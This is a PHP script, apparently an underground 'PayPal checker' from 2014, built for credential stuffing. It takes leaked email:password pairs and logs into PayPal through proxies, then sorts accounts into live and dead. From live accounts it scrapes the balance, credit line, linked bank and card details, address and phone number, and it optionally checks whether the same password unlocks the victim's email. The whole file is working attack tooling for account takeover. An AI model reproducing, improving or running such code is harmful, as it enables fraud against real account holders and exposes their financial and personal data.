<?php

/**
 * @author King Billy (Y!M: nvlqn)
 * @copyright 2014
 */

require ('./class_mail.php');
/* ############################################# CODE BY KING BILLY ############################################# */
set_time_limit(0);
include("use.php");
function curl($url = '', $var = '', $header = false, $nobody = false)
{
    global $config, $sock;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, random_uagent());
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/us/cgi-bin/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit');
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $config['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
//$config['useragent']   = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$dir                   = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz  = "";
$live = array();
function get($list)
{
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies()
{
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush()
{
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
    if ($output_handler == 'ob_gzhandler') {
        return;
    }
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function getCookies($str){
	preg_match_all('/Set-Cookie: ([^; ]+)(;| )/si', $str, $matches);
	$cookies = implode(";", $matches[1]);
	return $cookies;
}

function array_remove_empty($arr)
{
    $narr = array();
    while (list($key, $val) = each($arr))
    {
        if (is_array($val))
        {
            $val = array_remove_empty($val);
            // does the result array contain anything?
            if (count($val) != 0)
            {
                // yes :-)
                $narr[$key] = trim($val);
            }
        } else
        {
            if (trim($val) != "")
            {
                $narr[$key] = trim($val);
            }
        }
    }
    unset($arr);
    return $narr;
}

function display($m, $t = 1, $d = 0)
{
    if ($t == 1)
    {
        echo '<div>' . $m . '</div>';
    } else
    {
        echo $m;
    }
    if ($d)
    {
        exit;
    }
}
function inStr($s,$as){ 
        $s=strtoupper($s); 
        if(!is_array($as)) $as=array($as); 
        for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true; 
        return false; 
} 

if ($_REQUEST['do'] == 'check')
{	
	$mail = new Mail();
	delete_cookies();
    $result = array();
    $delim = $_REQUEST['delim'];
    list($email, $pwd) = explode($delim, $_REQUEST['mailpass']);
    //$sock = urldecode($_REQUEST['sock']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_REQUEST['mailpass']);
        echo json_encode($result);
        exit;
    }
	if (curl('https://www.paypal.com/','',true,true) === false) {
		$result['error'] = 3;
		$result['msg'] = '<b style="color:red;">[-] SOCKS DIE</b> => | ' . $sock . ' | Checked at UGCode.Com';
		continue;
	}
	$var = 'login_cmd=&login_params=&login_email='.rawurlencode($email) .'&login_password='.rawurlencode($pwd) .'&target_page=0&submit.x=Log+In&form_charset=UTF-8&browser_name=Firefox&browser_version=17&browser_version_full=17.0&operating_system=Windows';
    $page = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_run-check-cookie-submit&redirectCmd=_login-submit", $var);
	$title = fetch_value($page, '<title>', '</title>');
	if (inStr($page, 's.prop14=')) {
		$result['error'] = 2;
		$result['msg'] = '<b style="color:red;">[-] DIE</b> => | ' . $email . ' | ' . $pwd. ' | Checked at UGCode.Com';
	}else{
			$loggedIn = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
			//echo $page;
			if($title == "Security Measures - PayPal"){
				$result['error'] = 2;
				$result['msg'] = '<b style="color:#C88039;">[#] Security Measures</b> => | ' . $email . ' | ' . $pwd. ' | Checked at UGCode.Com';
			}elseif (stripos($loggedIn, 'PayPal balance') !== false || stripos($loggedIn, 'Log Out</a>') !== false) {
					if ($_REQUEST['email'])
                    {
                        switch ($mail->check($email, $pwd))
                        {
                            case '1':
                                $mailstt = ' | Mail: <b style="color:yellow;">Live</b>';
                                break;
                            case '-1':
                                $mailstt = ' | Mail: Unsupport';
                            default:
                                $mailstt = ' | Mail: <b style="color:red;">Die</b>';
                                break;
                        }
                    } else
                    {
                        $mailstt = '';
                    }
					$loggedIn     = preg_replace('/<!--google(off|on): all-->/si', '', $loggedIn);
					$loggedIn     = preg_replace('/\n+/si', '', $loggedIn);
					$pp['type']   = fetch_value($loggedIn, 's.prop7="', '"');
					$pp['type']   = '<span class="' . $pp['type'] . '">' . ucfirst($pp['type']) . '</span>';
					$pp['status'] = fetch_value($loggedIn, 's.prop8="', '"');
					$pp['status'] = '<span class="' . $pp['status'] . '">' . ucfirst($pp['status']) . '</span>';
					if (inStr($loggedIn, 'Your account access is limited')) {
						$pp['limited'] = '<font color="red">Limited</font>';
					}				
					if(inStr($loggedIn, '<div class="balanceNumeral"><span class="h2">')){
						$pp['bl'] = fetch_value($loggedIn, '<div class="balanceNumeral"><span class="h2">', '</span>');
					}else{
						$pp['bl'] = fetch_value($loggedIn, '<span class="balance">', '</span>');
					}
					if ($pp['bl']) {
						if (inStr($pp['bl'], 'strong')) {
							$pp['bl'] = trim(fetch_value($pp['bl'], '<strong>', '</strong>'));
						}
					} else {
						$pp['bl'] = fetch_value($loggedIn, '<span class="balance negative">', '</span>');
					}
					if (!$pp['limited']) {
						// PPSMART
						$ppsmart = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
						if (inStr($ppsmart, 'PayPal Smart Connect')) {
							$smartnum	= fetch_value($ppsmart, 'PayPal Smart Connect<span>', '</span>');
							$smartccn	= "SmartConnect[" . $smartnum . "]";							
							$pp['smart'] = $smartccn;						
						}else{
							$pp['smart'] = "No SmartConnect";
						}
						// PPBMLT
						$ppbmlt = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_account&nav=0.0");
						if (inStr($ppbmlt, 'Bill Me Later')) {
							$bmlbalance  = fetch_value($ppbmlt, 'Available credit: <span class="heavy">', '</span>');
							$bmlcredit	 = "BML Credit: <font color='gold'>" . $bmlbalance . "</font>";
							$pp['bmlt'] = $bmlcredit;
						}else{
							$pp['bmlt'] = "No Bill Me Laster";
						}
						// PPBANK
						$ppbank = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-ach&nav=0.5.1");
						if (inStr($ppbank, 'ach_id')) {
							$pp['bank'] = "Have Bank";
						}else{
							$pp['bank'] = "No Bank";
						}
						// PPCARD
						$ppcard = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru&flag_from_account_summary=1&nav=0.5.2");
						$checkcard = fetch_value($ppcard,'s.prop1="','"');
						if (stripos($checkcard,'ccadd') !== false) {
							$pp['card'] = "No Card";
						}else{
						preg_match_all('/<tr>(.+)<\/tr>/siU',$ppcard,$matches);
						$cc = array();
						foreach ($matches[1] AS $k =>$v) {
							if ($k >0) {
								preg_match_all('/<td>(.+)<\/td>/siU', $v, $m);
								$type = strtoupper(fetch_value($m[1][0],'&#x2f;icon&#x5f;','&#x2e;gif'));
								$ccnum = $m[1][1];
								$exp = $m[1][2];
								if (stristr($m[1][4],'complete_expanded_use.x')) {
									$confirmed = 'No Confirmed';
								}else{
									$confirmed = 'Confirmed';
								}
								$cc[] = "[$type x-$ccnum- $confirmed - $exp]";
								$cc++;
							}
						}
						$pp['card'] = "<font color=\"#EDAD39\">".implode("-",$cc) ."</font>";
						}
						
						// PPADD
						$ppadd = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-address&nav=0.6.3");
						$infoAddr     = str_replace('<br>', ', ', fetch_value($ppadd, 'emphasis">', '</span>'));
						$pp['address'] = substr($infoAddr, 0, -2);
						// PPPHONE
						$ppphone = curl("https://www.paypal.com/us/cgi-bin/webscr?cmd=_profile-phone&nav=0.6.4");
						$pp['phone'] = strip_tags('<input type="hidden" ' . fetch_value($ppphone, 'name="phone"', '</label>'));					 					
					}
					$pp['lastloggin'] = strip_tags(fetch_value($loggedIn, '<div class="small secondary">', '</div>'));
					$pp['lastloggin'] = str_replace('Last log in', '', $pp['lastloggin']);
					//echo $ppadd;
					$result['error'] = 0;
					$result['msg'] = '<b style="color:yellow;">[+] LIVE</b> =>  | ' . $email . ' | ' . $pwd . ' | '.$mailstt . ' | ' . implode(' | ', $pp) . ' | Checked at UGCode.Com';
			}else{
				$title = fetch_value($page, '<title>', '</title>');
				$result['error'] = 2;
				$result['msg'] = '<b style="color:#C88039;">[#] BAD ACCOUNT</b> => | ' . $email . ' | ' . $pwd . ' | ' . $title . ' | Checked at UGCode.Com';
			}  
	}
    echo json_encode($result);
    exit;

}

?>